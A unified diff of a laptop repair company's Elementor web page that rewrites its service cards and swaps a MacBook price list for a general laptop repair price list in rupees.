-		<div class="elementor-element elementor-element-93a0c7f e-con-full home_service_card e-flex e-con e-child" data-id="93a0c7f" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-356c532 e-con-full e-flex e-con e-child" data-id="356c532" data-element_type="container">
-				<div class="elementor-element elementor-element-b21df42 elementor-widget elementor-widget-image" data-id="b21df42" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-bdb20a6 e-con-full e-flex e-con e-child" data-id="bdb20a6" data-element_type="container">
+		<div class="elementor-element elementor-element-4ad5ade e-con-full e-flex e-con e-child" data-id="4ad5ade" data-element_type="container">
+		<div class="elementor-element elementor-element-ac45f8b e-con-full home_service_card e-flex e-con e-child" data-id="ac45f8b" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-1970f7f e-con-full e-flex e-con e-child" data-id="1970f7f" data-element_type="container">
+				<div class="elementor-element elementor-element-24370b2 elementor-widget elementor-widget-image" data-id="24370b2" data-element_type="widget" data-widget_type="image.default">
 															<img decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/repair.png" class="attachment-full size-full wp-image-10196" alt="screen repair" srcset="https://lynixworld.com/wp-content/uploads/2025/07/repair.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/repair-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/repair-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
 				</div>
-		<div class="elementor-element elementor-element-2c0dfd5 e-con-full e-flex e-con e-child" data-id="2c0dfd5" data-element_type="container">
-				<div class="elementor-element elementor-element-d3fc8c9 service_card_heading elementor-widget elementor-widget-heading" data-id="d3fc8c9" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-c88451e e-con-full e-flex e-con e-child" data-id="c88451e" data-element_type="container">
+				<div class="elementor-element elementor-element-5066637 service_card_heading elementor-widget elementor-widget-heading" data-id="5066637" data-element_type="widget" data-widget_type="heading.default">
 					<h4 class="elementor-heading-title elementor-size-default">Screen Replacement</h4>				</div>
-				<div class="elementor-element elementor-element-890f4ce elementor-widget elementor-widget-text-editor" data-id="890f4ce" data-element_type="widget" data-widget_type="text-editor.default">
-									<p data-start="228" data-end="368">We offer screen replacement right in front of you. No waiting, no going to shops all repair done at your doorstep.</p>								</div>
+				<div class="elementor-element elementor-element-160e731 elementor-widget elementor-widget-text-editor" data-id="160e731" data-element_type="widget" data-widget_type="text-editor.default">
+									<p data-start="228" data-end="368">We replace damaged and cracked laptop screens completely at your doorstep in front of your eyes.</p>								</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-b56dc7d e-con-full home_service_card e-flex e-con e-child" data-id="b56dc7d" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-03db8e7 e-con-full e-flex e-con e-child" data-id="03db8e7" data-element_type="container">
-				<div class="elementor-element elementor-element-8b21ec7 elementor-widget elementor-widget-image" data-id="8b21ec7" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-78f12a7 e-con-full home_service_card e-flex e-con e-child" data-id="78f12a7" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-84b45fd e-con-full e-flex e-con e-child" data-id="84b45fd" data-element_type="container">
+				<div class="elementor-element elementor-element-eb0e822 elementor-widget elementor-widget-image" data-id="eb0e822" data-element_type="widget" data-widget_type="image.default">
 															<img decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/battery.png" class="attachment-full size-full wp-image-10200" alt="battery" srcset="https://lynixworld.com/wp-content/uploads/2025/07/battery.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/battery-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/battery-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
 				</div>
-		<div class="elementor-element elementor-element-fac6a8e e-con-full e-flex e-con e-child" data-id="fac6a8e" data-element_type="container">
-				<div class="elementor-element elementor-element-8210cde service_card_heading elementor-widget elementor-widget-heading" data-id="8210cde" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-ddc5c56 e-con-full e-flex e-con e-child" data-id="ddc5c56" data-element_type="container">
+				<div class="elementor-element elementor-element-04f0846 service_card_heading elementor-widget elementor-widget-heading" data-id="04f0846" data-element_type="widget" data-widget_type="heading.default">
 					<h4 class="elementor-heading-title elementor-size-default">Battery Replacement</h4>				</div>
-				<div class="elementor-element elementor-element-804e2df elementor-widget elementor-widget-text-editor" data-id="804e2df" data-element_type="widget" data-widget_type="text-editor.default">
-									<p data-start="595" data-end="726">Genuine part with good battery backup, 1-year warranty, and invoice.</p>								</div>
+				<div class="elementor-element elementor-element-b447acd elementor-widget elementor-widget-text-editor" data-id="b447acd" data-element_type="widget" data-widget_type="text-editor.default">
+									<p data-start="595" data-end="726">Quality battery replacement with 1 year of warranty, Laptop battery replaced at your doorstep.</p>								</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-e05e27c e-con-full home_service_card e-flex e-con e-child" data-id="e05e27c" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-8be98dd e-con-full e-flex e-con e-child" data-id="8be98dd" data-element_type="container">
-				<div class="elementor-element elementor-element-9cff65e elementor-widget elementor-widget-image" data-id="9cff65e" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-88abec8 e-con-full home_service_card e-flex e-con e-child" data-id="88abec8" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-d43ee48 e-con-full e-flex e-con e-child" data-id="d43ee48" data-element_type="container">
+				<div class="elementor-element elementor-element-ba2a63c elementor-widget elementor-widget-image" data-id="ba2a63c" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/ram.png" class="attachment-full size-full wp-image-10202" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/07/ram.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/ram-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/ram-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
 				</div>
-		<div class="elementor-element elementor-element-cdb7a7b e-con-full e-flex e-con e-child" data-id="cdb7a7b" data-element_type="container">
-				<div class="elementor-element elementor-element-c71b132 service_card_heading elementor-widget elementor-widget-heading" data-id="c71b132" data-element_type="widget" data-widget_type="heading.default">
-					<h4 class="elementor-heading-title elementor-size-default">SSD and RAM Upgrades</h4>				</div>
-				<div class="elementor-element elementor-element-e83251c elementor-widget elementor-widget-text-editor" data-id="e83251c" data-element_type="widget" data-widget_type="text-editor.default">
-									<p>If you want to increase speed or need gaming RAM or M2 SSD, we have all. We will replace it at the doorstep. No need to step out.</p>								</div>
+		<div class="elementor-element elementor-element-3a915aa e-con-full e-flex e-con e-child" data-id="3a915aa" data-element_type="container">
+				<div class="elementor-element elementor-element-e32eb0c service_card_heading elementor-widget elementor-widget-heading" data-id="e32eb0c" data-element_type="widget" data-widget_type="heading.default">
+					<h4 class="elementor-heading-title elementor-size-default">SSD or RAM Upgrades</h4>				</div>
+				<div class="elementor-element elementor-element-2bb251e elementor-widget elementor-widget-text-editor" data-id="2bb251e" data-element_type="widget" data-widget_type="text-editor.default">
+									<p>Quick replacement to improve the performance of your laptop. The SSD is replaced at your doorstep in front of your eyes, and it comes with a 1-year warranty.</p>								</div>
 				</div>
 				</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-9af1576 e-con-full e-flex e-con e-child" data-id="9af1576" data-element_type="container">
-		<div class="elementor-element elementor-element-ce86cd7 e-con-full e-flex e-con e-child" data-id="ce86cd7" data-element_type="container">
-		<div class="elementor-element elementor-element-b8c11fd e-con-full home_service_card e-flex e-con e-child" data-id="b8c11fd" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-70003c0 e-con-full e-flex e-con e-child" data-id="70003c0" data-element_type="container">
-				<div class="elementor-element elementor-element-c5cd901 elementor-widget elementor-widget-image" data-id="c5cd901" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-d86bc82 e-con-full e-flex e-con e-child" data-id="d86bc82" data-element_type="container">
+		<div class="elementor-element elementor-element-881004f e-con-full e-flex e-con e-child" data-id="881004f" data-element_type="container">
+		<div class="elementor-element elementor-element-9ddfff9 e-con-full home_service_card e-flex e-con e-child" data-id="9ddfff9" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-6dec5af e-con-full e-flex e-con e-child" data-id="6dec5af" data-element_type="container">
+				<div class="elementor-element elementor-element-dfcafc5 elementor-widget elementor-widget-image" data-id="dfcafc5" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/keyboard.png" class="attachment-full size-full wp-image-10201" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/07/keyboard.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/keyboard-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/keyboard-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
 				</div>
-		<div class="elementor-element elementor-element-fed9f69 e-con-full e-flex e-con e-child" data-id="fed9f69" data-element_type="container">
-				<div class="elementor-element elementor-element-0bd55c6 service_card_heading elementor-widget elementor-widget-heading" data-id="0bd55c6" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-e07588a e-con-full e-flex e-con e-child" data-id="e07588a" data-element_type="container">
+				<div class="elementor-element elementor-element-a8f80b2 service_card_heading elementor-widget elementor-widget-heading" data-id="a8f80b2" data-element_type="widget" data-widget_type="heading.default">
 					<h4 class="elementor-heading-title elementor-size-default">Keyboard and Trackpad Repair</h4>				</div>
-				<div class="elementor-element elementor-element-ebec403 elementor-widget elementor-widget-text-editor" data-id="ebec403" data-element_type="widget" data-widget_type="text-editor.default">
-									<p>Oops, spilled water, or stopped working, we will replace or repair the trackpad at your home.</p>								</div>
+				<div class="elementor-element elementor-element-5f4a482 elementor-widget elementor-widget-text-editor" data-id="5f4a482" data-element_type="widget" data-widget_type="text-editor.default">
+									<p>Laptop keyboard replacement by Lynix World engineers at the doorstep.</p>								</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-144d0de e-con-full home_service_card e-flex e-con e-child" data-id="144d0de" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-db02224 e-con-full e-flex e-con e-child" data-id="db02224" data-element_type="container">
-				<div class="elementor-element elementor-element-0771f19 elementor-widget elementor-widget-image" data-id="0771f19" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-16cc0dc e-con-full home_service_card e-flex e-con e-child" data-id="16cc0dc" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-1c6930a e-con-full e-flex e-con e-child" data-id="1c6930a" data-element_type="container">
+				<div class="elementor-element elementor-element-cc57758 elementor-widget elementor-widget-image" data-id="cc57758" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/motherboard.png" class="attachment-full size-full wp-image-10197" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/07/motherboard.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/motherboard-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/motherboard-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
 				</div>
-		<div class="elementor-element elementor-element-e67a127 e-con-full e-flex e-con e-child" data-id="e67a127" data-element_type="container">
-				<div class="elementor-element elementor-element-77b8512 service_card_heading elementor-widget elementor-widget-heading" data-id="77b8512" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-52679d0 e-con-full e-flex e-con e-child" data-id="52679d0" data-element_type="container">
+				<div class="elementor-element elementor-element-e0eb88f service_card_heading elementor-widget elementor-widget-heading" data-id="e0eb88f" data-element_type="widget" data-widget_type="heading.default">
 					<h4 class="elementor-heading-title elementor-size-default">Motherboard Repairs</h4>				</div>
-				<div class="elementor-element elementor-element-1202450 elementor-widget elementor-widget-text-editor" data-id="1202450" data-element_type="widget" data-widget_type="text-editor.default">
-									<p data-start="763" data-end="902">We do all types of motherboard repair, from replacing or fixing broken connections and ICs.</p>								</div>
+				<div class="elementor-element elementor-element-26b8c32 elementor-widget elementor-widget-text-editor" data-id="26b8c32" data-element_type="widget" data-widget_type="text-editor.default">
+									<p data-start="763" data-end="902">We try to fix the motherboard by replacing the IC and repairing the graphic card of any laptop. No fix, No fees!</p>								</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-4946de5 e-con-full home_service_card e-flex e-con e-child" data-id="4946de5" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-03de20b e-con-full e-flex e-con e-child" data-id="03de20b" data-element_type="container">
-				<div class="elementor-element elementor-element-6395d85 elementor-widget elementor-widget-image" data-id="6395d85" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-592bed3 e-con-full home_service_card e-flex e-con e-child" data-id="592bed3" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-51b2145 e-con-full e-flex e-con e-child" data-id="51b2145" data-element_type="container">
+				<div class="elementor-element elementor-element-bb78316 elementor-widget elementor-widget-image" data-id="bb78316" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/computer-1.png" class="attachment-full size-full wp-image-10198" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/07/computer-1.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/computer-1-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/computer-1-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
 				</div>
-		<div class="elementor-element elementor-element-9b3e11f e-con-full e-flex e-con e-child" data-id="9b3e11f" data-element_type="container">
-				<div class="elementor-element elementor-element-9fe898c service_card_heading elementor-widget elementor-widget-heading" data-id="9fe898c" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-2e04038 e-con-full e-flex e-con e-child" data-id="2e04038" data-element_type="container">
+				<div class="elementor-element elementor-element-2e52717 service_card_heading elementor-widget elementor-widget-heading" data-id="2e52717" data-element_type="widget" data-widget_type="heading.default">
 					<h4 class="elementor-heading-title elementor-size-default">Water Damage Repair</h4>				</div>
-				<div class="elementor-element elementor-element-b0caf16 elementor-widget elementor-widget-text-editor" data-id="b0caf16" data-element_type="widget" data-widget_type="text-editor.default">
-									<p data-start="1100" data-end="1224">We have the proper tools to recover your water-damaged laptop and get it working again.</p>								</div>
+				<div class="elementor-element elementor-element-ff0751f elementor-widget elementor-widget-text-editor" data-id="ff0751f" data-element_type="widget" data-widget_type="text-editor.default">
+									<p data-start="1100" data-end="1224">We are experts in fixing laptops damaged by water or spilled coffee.</p>								</div>
 				</div>
 				</div>
 				</div>
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-22da15b e-flex e-con-boxed e-con e-parent" data-id="22da15b" data-element_type="container">
+		<div class="elementor-element elementor-element-924e2b5 e-flex e-con-boxed e-con e-parent" data-id="924e2b5" data-element_type="container">
 					<div class="e-con-inner">
-				<div class="elementor-element elementor-element-99a8c37 elementor-align-center elementor-widget elementor-widget-button" data-id="99a8c37" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-element elementor-element-206475e elementor-align-center elementor-widget elementor-widget-button" data-id="206475e" data-element_type="widget" data-widget_type="button.default">
 										<a class="elementor-button elementor-button-link elementor-size-sm" href="https://wa.me/918000002218">
 						<span class="elementor-button-content-wrapper">
 						<span class="elementor-button-icon">
@@ -305,72 +305,76 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 								</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-c1145ad e-flex e-con-boxed e-con e-parent" data-id="c1145ad" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-cba8b24 e-flex e-con-boxed e-con e-parent" data-id="cba8b24" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
 					<div class="e-con-inner">
-		<div class="elementor-element elementor-element-199bcfb e-con-full e-flex e-con e-child" data-id="199bcfb" data-element_type="container">
-		<div class="elementor-element elementor-element-7e43474 e-con-full e-flex e-con e-child" data-id="7e43474" data-element_type="container">
-				<div class="elementor-element elementor-element-8819c9d elementor-widget elementor-widget-heading" data-id="8819c9d" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-f40aff7 e-con-full e-flex e-con e-child" data-id="f40aff7" data-element_type="container">
+		<div class="elementor-element elementor-element-f0f7a59 e-con-full e-flex e-con e-child" data-id="f0f7a59" data-element_type="container">
+				<div class="elementor-element elementor-element-11dd682 elementor-widget elementor-widget-heading" data-id="11dd682" data-element_type="widget" data-widget_type="heading.default">
 					<h2 class="elementor-heading-title elementor-size-default">We Value Your Time &amp; Device</h2>				</div>
 				</div>
-		<div class="elementor-element elementor-element-5586e74 e-con-full e-flex e-con e-child" data-id="5586e74" data-element_type="container">
-		<div class="elementor-element elementor-element-d2d3ac1 e-con-full e-flex e-con e-child" data-id="d2d3ac1" data-element_type="container">
-				<div class="elementor-element elementor-element-8444720 elementor-widget elementor-widget-image" data-id="8444720" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-af969e9 e-con-full e-flex e-con e-child" data-id="af969e9" data-element_type="container">
+		<div class="elementor-element elementor-element-302dc71 e-con-full e-flex e-con e-child" data-id="302dc71" data-element_type="container">
+				<div class="elementor-element elementor-element-4e4a37a elementor-widget elementor-widget-image" data-id="4e4a37a" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/08/clock.png" class="attachment-full size-full wp-image-10814" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/08/clock.png 512w, https://lynixworld.com/wp-content/uploads/2025/08/clock-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/08/clock-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
-				<div class="elementor-element elementor-element-cb64313 elementor-widget elementor-widget-text-editor" data-id="cb64313" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-8b8621e elementor-widget elementor-widget-text-editor" data-id="8b8621e" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>2-Hour Response Time</p>								</div>
-				<div class="elementor-element elementor-element-b28cbbf elementor-widget elementor-widget-text-editor" data-id="b28cbbf" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-c1e01c0 elementor-widget elementor-widget-text-editor" data-id="c1e01c0" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Choose device &amp; issue</p>								</div>
 				</div>
-		<div class="elementor-element elementor-element-545cfc5 e-con-full e-flex e-con e-child" data-id="545cfc5" data-element_type="container">
-				<div class="elementor-element elementor-element-79db493 elementor-widget elementor-widget-image" data-id="79db493" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-9f6625a e-con-full e-flex e-con e-child" data-id="9f6625a" data-element_type="container">
+				<div class="elementor-element elementor-element-510df61 elementor-widget elementor-widget-image" data-id="510df61" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/08/customer-success.png" class="attachment-full size-full wp-image-10813" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/08/customer-success.png 512w, https://lynixworld.com/wp-content/uploads/2025/08/customer-success-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/08/customer-success-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
-				<div class="elementor-element elementor-element-a924530 elementor-widget elementor-widget-text-editor" data-id="a924530" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-bdb572e elementor-widget elementor-widget-text-editor" data-id="bdb572e" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Experienced Engineers</p>								</div>
-				<div class="elementor-element elementor-element-2c466df elementor-widget elementor-widget-text-editor" data-id="2c466df" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-a581d89 elementor-widget elementor-widget-text-editor" data-id="a581d89" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Pick time &amp; date</p>								</div>
 				</div>
-		<div class="elementor-element elementor-element-a9928c5 e-con-full e-flex e-con e-child" data-id="a9928c5" data-element_type="container">
-				<div class="elementor-element elementor-element-20d4054 elementor-widget elementor-widget-image" data-id="20d4054" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-5883e08 e-con-full e-flex e-con e-child" data-id="5883e08" data-element_type="container">
+				<div class="elementor-element elementor-element-5bd8774 elementor-widget elementor-widget-image" data-id="5bd8774" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/08/support.png" class="attachment-full size-full wp-image-10812" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/08/support.png 512w, https://lynixworld.com/wp-content/uploads/2025/08/support-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/08/support-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
-				<div class="elementor-element elementor-element-0b7f750 elementor-widget elementor-widget-text-editor" data-id="0b7f750" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-3796b26 elementor-widget elementor-widget-text-editor" data-id="3796b26" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Tools For Safe Repair</p>								</div>
-				<div class="elementor-element elementor-element-dfb5b3e elementor-widget elementor-widget-text-editor" data-id="dfb5b3e" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-f025333 elementor-widget elementor-widget-text-editor" data-id="f025333" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Engineer visits your location</p>								</div>
 				</div>
-		<div class="elementor-element elementor-element-0d7f1bb e-con-full e-flex e-con e-child" data-id="0d7f1bb" data-element_type="container">
-				<div class="elementor-element elementor-element-e425cc6 elementor-widget elementor-widget-image" data-id="e425cc6" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-2cd38dd e-con-full e-flex e-con e-child" data-id="2cd38dd" data-element_type="container">
+				<div class="elementor-element elementor-element-2dc929e elementor-widget elementor-widget-image" data-id="2dc929e" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/08/repairing-service.png" class="attachment-full size-full wp-image-10811" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/08/repairing-service.png 512w, https://lynixworld.com/wp-content/uploads/2025/08/repairing-service-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/08/repairing-service-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
-				<div class="elementor-element elementor-element-f9d1722 elementor-widget elementor-widget-text-editor" data-id="f9d1722" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-9ab5bb3 elementor-widget elementor-widget-text-editor" data-id="9ab5bb3" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Clear Repair Updates</p>								</div>
-				<div class="elementor-element elementor-element-7a85e0c elementor-widget elementor-widget-text-editor" data-id="7a85e0c" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-63070ba elementor-widget elementor-widget-text-editor" data-id="63070ba" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Only pay if fixed</p>								</div>
 				</div>
 				</div>
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-2a504f8 e-flex e-con-boxed e-con e-parent" data-id="2a504f8" data-element_type="container">
+		<div class="elementor-element elementor-element-7a9e7e1 e-flex e-con-boxed e-con e-parent" data-id="7a9e7e1" data-element_type="container">
 					<div class="e-con-inner">
-				<div class="elementor-element elementor-element-95a28ee elementor-widget elementor-widget-heading" data-id="95a28ee" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-element elementor-element-7701c9c elementor-widget elementor-widget-heading" data-id="7701c9c" data-element_type="widget" data-widget_type="heading.default">
 					<h2 class="elementor-heading-title elementor-size-default"><span style="color:#FE6E00">Our Pricing</span>  Policy</h2>				</div>
-				<div class="elementor-element elementor-element-d62404d elementor-widget elementor-widget-text-editor" data-id="d62404d" data-element_type="widget" data-widget_type="text-editor.default">
-									<p>We follow a clear policy that states no fix, no charge, meaning you don&#8217;t have to pay anything unless the work is done or the Macbook is fixed.</p>								</div>
+				<div class="elementor-element elementor-element-817bcf1 elementor-widget elementor-widget-text-editor" data-id="817bcf1" data-element_type="widget" data-widget_type="text-editor.default">
+									<p>No Fix, No Fee policy. We only charge you when you receive a wholly fixed laptop; we dont charge if your laptop is not fixed.</p>								</div>
 					</div>
 				</div>
 				<section class="elementor-section elementor-top-section elementor-element elementor-element-0f69ca3 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="0f69ca3" data-element_type="section">
 						<div class="elementor-container elementor-column-gap-default">
 					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-8fd5d29" data-id="8fd5d29" data-element_type="column">
 			<div class="elementor-widget-wrap elementor-element-populated">
-						<div class="elementor-element elementor-element-fab54bb elementor-widget elementor-widget-html" data-id="fab54bb" data-element_type="widget" data-widget_type="html.default">
-					<!-- MacBook Repair – National Page -->
+						<div class="elementor-element elementor-element-89628a9 elementor-widget elementor-widget-html" data-id="89628a9" data-element_type="widget" data-widget_type="html.default">
+					<!-- Laptop Repair Services – Main Page -->
 <section style="font-family: Poppins, sans-serif; padding: 40px 20px; background-color: #ffffff;">
   <div style="max-width: 1200px; margin: auto; display: flex; flex-wrap: wrap; gap: 40px; align-items: stretch;">
 
     <!-- Left Content -->
     <div style="flex: 1 1 60%; min-width: 300px;">
       <h2 style="font-size: 32px; font-weight: 700; color: #0D1216; margin-bottom: 24px;">
-        MacBook Repair Price List – India
+        Laptop Repair Price List – India (Doorstep Service)
       </h2>
+      <p style="font-size: 16px; color: #555; margin-bottom: 20px;">
+        At <strong>Lynix World</strong>, we provide professional and transparent laptop repair services across India. Whether you're in Chandigarh, Delhi, Noida or anywhere else, our experts can replace your screen, battery, keyboard, and even repair your motherboard right at your doorstep.
+      </p>
+
       <table style="width:100%; border-collapse: collapse; font-size: 16px;">
         <thead style="background-color: #FF6900; color: white;">
           <tr>
@@ -379,49 +383,51 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
           </tr>
         </thead>
         <tbody>
-          <tr><td style="padding: 10px;">✔️ MacBook Diagnosis</td><td style="padding: 10px;">FREE</td></tr>
+          <tr><td style="padding: 10px;">✔️ Laptop Diagnosis</td><td style="padding: 10px;">FREE</td></tr>
           <tr style="background-color: #f9f9f9;"><td style="padding: 10px;">✔️ Screen Replacement</td><td style="padding: 10px;">₹4999, 1 Year Warranty</td></tr>
-          <tr><td style="padding: 10px;">✔️ Battery Replacement</td><td style="padding: 10px;">₹2999, 1 Year Warranty</td></tr>
-          <tr style="background-color: #f9f9f9;"><td style="padding: 10px;">✔️ Keyboard & Trackpad</td><td style="padding: 10px;">₹1999+, Original Parts</td></tr>
-          <tr><td style="padding: 10px;">✔️ SSD/RAM Upgrade</td><td style="padding: 10px;">₹2599+, 3 Years Warranty</td></tr>
-          <tr style="background-color: #f9f9f9;"><td style="padding: 10px;">✔️ Motherboard Repair</td><td style="padding: 10px;">₹1499+, Up to 3 Months</td></tr>
-          <tr><td style="padding: 10px;">✔️ MacOS Installation</td><td style="padding: 10px;">₹699, All Versions Supported</td></tr>
+          <tr><td style="padding: 10px;">✔️ Battery Replacement</td><td style="padding: 10px;">₹2499, 1 Year Warranty</td></tr>
+          <tr style="background-color: #f9f9f9;"><td style="padding: 10px;">✔️ Motherboard Repair</td><td style="padding: 10px;">₹1499, 3 Months Warranty</td></tr>
+          <tr><td style="padding: 10px;">✔️ Keyboard Replacement</td><td style="padding: 10px;">₹1999, 1 Year Warranty</td></tr>
+          <tr style="background-color: #f9f9f9;"><td style="padding: 10px;">✔️ Charging Port Repair</td><td style="padding: 10px;">₹1999, 1 Year Warranty</td></tr>
+          <tr><td style="padding: 10px;">✔️ SSD Upgrade (256GB)</td><td style="padding: 10px;">₹2599, 3 Years Warranty</td></tr>
+          <tr style="background-color: #f9f9f9;"><td style="padding: 10px;">✔️ RAM Upgrade (8GB DDR4)</td><td style="padding: 10px;">₹1499, Lifetime Warranty</td></tr>
+          <tr><td style="padding: 10px;">✔️ Windows & Driver Setup</td><td style="padding: 10px;">₹699, Basic Software Included</td></tr>
         </tbody>
       </table>
 
       <div style="margin-top: 20px; background: #f1f5f9; padding: 16px; border-radius: 8px; font-size: 14px; color: #333;">
         <strong>Note:</strong><br>
-        • Prices shown above are standard starting rates across India.<br>
-        • Final charges may vary based on model and issue severity.<br>
-        • Warranty applies only to parts replaced.
